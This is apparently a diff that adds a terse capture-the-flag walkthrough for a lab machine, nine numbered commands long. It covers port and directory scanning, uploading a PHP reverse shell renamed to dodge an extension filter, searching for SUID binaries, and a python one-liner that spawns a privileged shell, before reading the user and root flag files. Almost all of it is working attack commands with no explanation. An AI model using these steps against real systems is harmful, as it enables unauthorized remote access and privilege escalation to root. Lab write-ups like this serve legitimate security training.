@@ -1,0 +1,9 @@
+1 - nmap -A 10.10.154.95
+2 - gobuster dir -u http://10.10.154.95/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - http://10.10.154.95/panel
+4 - cp /usr/share/webshells/php/php-reverse-shell.php shell.pHp5
+5 - cat /var/www/user.txt
+6 - find / -perm -u=s -type f 2>/dev/null (python)
+7 - python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+8 - whoami
+9 - cat /root/root.txt
